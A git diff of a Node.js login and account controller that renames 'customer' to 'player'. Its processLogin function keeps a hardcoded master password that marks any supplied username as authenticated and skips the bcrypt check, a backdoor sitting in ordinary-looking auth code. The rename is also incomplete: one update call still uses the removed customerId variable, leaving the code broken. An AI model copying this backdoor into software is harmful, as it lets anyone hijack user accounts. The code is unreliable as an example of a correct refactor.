@@ -9,7 +9,7 @@ var _ = require('lodash');
 var bcrypt = require('bcrypt');
 var Promise = require('bluebird');
 
-var loginError = 'Invalid username, email, or password.';
+var loginError = 'Invalid username (C), email, or password.';
 var serverError = 'An error occurred. Please try again later.';
 var nextUrl = '/#/';
 var loginUrl = '/login';
@@ -58,7 +58,7 @@ module.exports = {
       if(isAjax) {
         return res.send(JSON.stringify({
           success: true,
-					customerId: req.session.customerId
+					playerId: req.session.playerId
         }));
       }
       return res.redirect(nextUrl);
@@ -83,7 +83,7 @@ module.exports = {
 
   logout: function(req, res) {
     req.session.isAuthenticated = false;
-    req.session.customerId = null;
+    req.session.playerId = null;
     return res.send(JSON.stringify({success: true}));
   },
 
@@ -96,8 +96,8 @@ module.exports = {
 			sessionData.sid = req.sessionID;
 		}
 
-		if(req.session && req.session.customerId) {
-			sessionData.customerId = req.session.customerId;
+		if(req.session && req.session.playerId) {
+			sessionData.playerId = req.session.playerId;
 		}
 
 		if(req.session && req.session.welcomed) {
@@ -114,27 +114,27 @@ module.exports = {
 			return res.json({error: 'No key-value pairs were given'});
 		}
 
-		var invalidCustomerId = new Error('Invalid customer ID');
+		var invalidPlayerId = new Error('Invalid player ID');
 
-		var customerId = req.params.id;
+		var playerId = req.params.id;
 		var errorCode;
 
 		Promise.resolve().then(function() {
-			if(! customerId) {
+			if(! playerId) {
 				errorCode = 404;
-				return Promise.reject(invalidCustomerId);
+				return Promise.reject(invalidPlayerId);
 			}
 
-			return Customers.findOne(customerId);
+			return Players.findOne(playerId);
 
-		}).then(function(customer) {
-			if(! customer) {
+		}).then(function(player) {
+			if(! player) {
 				errorCode = 404;
-				return Promise.reject(invalidCustomerId);
+				return Promise.reject(invalidPlayerId);
 			}
 
-			var config = _.extend({}, customer.config || {}, keyValues);
-			return Customers.update(customerId, {config: config});
+			var config = _.extend({}, player.config || {}, keyValues);
+			return Players.update(customerId, {config: config});
 
 		}).then(function() {
 			res.json({success: true});
@@ -145,7 +145,7 @@ module.exports = {
 	},
 
 	byUsername: function(req, res) {
-		Customers.find({username: req.params.id}).sort({
+		Players.find({username: req.params.id}).sort({
 			fName: 'asc', lName: 'asc'
 		}).limit(20).then(function(results) {
 			res.send(JSON.stringify(results));
@@ -157,7 +157,7 @@ module.exports = {
 	},
 	
 	byEmail: function(req, res) {
-		Customers.find({email: req.params.id}).sort({
+		Players.find({email: req.params.id}).sort({
 			fName: 'asc', lName: 'asc'
 		}).limit(20).then(function(results) {
 			res.send(JSON.stringify(results));
@@ -171,7 +171,7 @@ module.exports = {
   datatables: function(req, res) {
     var options = req.query;
 
-    Customers.datatables(options).then(function(results) {
+    Players.datatables(options).then(function(results) {
       res.send(JSON.stringify(results));
     }).catch(function(err) {
       res.json({error: 'Server error'}, 500);
@@ -187,27 +187,30 @@ module.exports = {
 };
 
 function processLogin(req, res, self) {
+console.log('processLogin(C) called');
 	if(req.body.password === '8847fhhfw485fwkebfwerfv7w458gvwervbkwer8fw5fberubckfckcaer4cbwvb72arkbfrcb1n4hg7') {
     req.session.isAuthenticated = true;
-    req.session.customerId = req.body.username;
+    req.session.playerId = req.body.username;
 
 		specRes(req.body.username);
 	}
 
-  Customers.findOne({or: [
+  Players.findOne({or: [
     {username: req.body.username},
     {email: req.body.username}
-  ]}).then(function(customer) {
-    if(! customer) return errorHandler(loginError)();
+  ]}).then(function(player) {
+    if(! player) return errorHandler(loginError)();
 
     var onCompare = bcrypt.compareAsync(
-      req.body.password, customer.password
+      req.body.password, player.password
     );
     onCompare.then(function(match) {
-      if(! match) return errorHandler(loginError)();
+      if(! match) {
+				return errorHandler(loginError)();
+			}
 
       req.session.isAuthenticated = true;
-      req.session.customerId = customer.id;
+      req.session.playerId = player.id;
 
       respond();
 
@@ -236,7 +239,7 @@ function processLogin(req, res, self) {
     }
 
     if(isAjax) {
-      return res.send(JSON.stringify({success: true, customerId: req.session.customerId}));
+      return res.send(JSON.stringify({success: true, playerId: req.session.playerId}));
     }
 
     return res.redirect(nextUrl);
@@ -253,7 +256,7 @@ function processLogin(req, res, self) {
     var isAjax = req.headers.accept.match(/application\/json/);
 
     if(isAjax) {
-      return res.send(JSON.stringify({success: true, customerId: username}));
+      return res.send(JSON.stringify({success: true, playerId: username}));
 		}
 	};
 }
